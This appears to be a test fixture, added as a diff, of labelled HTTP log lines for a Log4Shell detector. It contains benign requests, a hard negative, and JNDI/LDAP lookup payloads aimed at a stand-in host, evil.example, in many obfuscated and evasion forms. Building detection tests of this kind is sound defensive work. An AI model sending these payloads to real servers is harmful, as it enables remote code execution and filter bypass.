@@ -1,0 +1,100 @@
+[
+  {
+    "name": "Benign home request",
+    "group": "Benign",
+    "log": "GET /home HTTP/1.1 Host: shop.local User-Agent: Mozilla/5.0",
+    "expected": "benign",
+    "story": "A normal web request with no lookup syntax."
+  },
+  {
+    "name": "Clean API request",
+    "group": "Benign",
+    "log": "GET /api/products?id=123 HTTP/1.1 Host: shop.local User-Agent: Mozilla/5.0",
+    "expected": "benign",
+    "story": "A benign API request used to show low-risk classification."
+  },
+  {
+    "name": "Static asset request",
+    "group": "Benign",
+    "log": "GET /static/app.js HTTP/1.1 Host: shop.local",
+    "expected": "benign",
+    "story": "A static asset request that should stay benign."
+  },
+  {
+    "name": "Hard negative documentation",
+    "group": "Hard Negative",
+    "log": "Security scanner report mentions \\${jndi:ldap://example.com/a} as text",
+    "expected": "benign",
+    "story": "A documentation-like line that contains payload text but is not a runtime exploit attempt."
+  },
+  {
+    "name": "Plain Log4Shell",
+    "group": "Malicious",
+    "log": "GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim.local",
+    "expected": "malicious",
+    "story": "Canonical JNDI lookup payload."
+  },
+  {
+    "name": "Mixed case payload",
+    "group": "Obfuscated",
+    "log": "GET /?q=${JnDi:LdAp://evil.example/mixed} HTTP/1.1",
+    "expected": "malicious",
+    "story": "Case manipulation designed to bypass simple case-sensitive matching."
+  },
+  {
+    "name": "URL encoded payload",
+    "group": "Obfuscated",
+    "log": "GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1 Host: victim.local",
+    "expected": "malicious",
+    "story": "Encoded braces and separators are decoded by canonicalization."
+  },
+  {
+    "name": "Triple URL encoded payload",
+    "group": "Obfuscated",
+    "log": "GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fevil.example%25252Fa%25257D HTTP/1.1",
+    "expected": "malicious",
+    "story": "Repeated URL encoding tests whether shallow decoding is enough."
+  },
+  {
+    "name": "Unicode escape payload",
+    "group": "Obfuscated",
+    "log": "GET /?q=${\\u006a\\u006e\\u0064\\u0069:ldap://evil.example/unicode} HTTP/1.1",
+    "expected": "malicious",
+    "story": "Unicode escapes reconstruct the JNDI token."
+  },
+  {
+    "name": "Nested lower lookup",
+    "group": "Obfuscated",
+    "log": "GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a} HTTP/1.1",
+    "expected": "malicious",
+    "story": "Nested lower lookups reconstruct the JNDI token."
+  },
+  {
+    "name": "Environment fallback",
+    "group": "Obfuscated",
+    "log": "GET /?q=${${env:NaN:-j}${env:NaN:-n}${env:NaN:-d}${env:NaN:-i}:ldap://evil.example/env} HTTP/1.1",
+    "expected": "malicious",
+    "story": "Environment fallback syntax recovers characters through default values."
+  },
+  {
+    "name": "Comment injection",
+    "group": "Evasion",
+    "log": "GET /?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1",
+    "expected": "malicious",
+    "story": "Comment-like noise breaks the literal jndi token for simple signatures."
+  },
+  {
+    "name": "Homoglyph JNDI",
+    "group": "Evasion",
+    "log": "GET /?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1",
+    "expected": "malicious",
+    "story": "A Unicode lookalike replaces the first JNDI character."
+  },
+  {
+    "name": "Zero-width JNDI",
+    "group": "Evasion",
+    "log": "GET /?q=${j​ndi:ldap://evil.example/zw} HTTP/1.1",
+    "expected": "malicious",
+    "story": "An invisible character is inserted inside the JNDI token."
+  }
+]
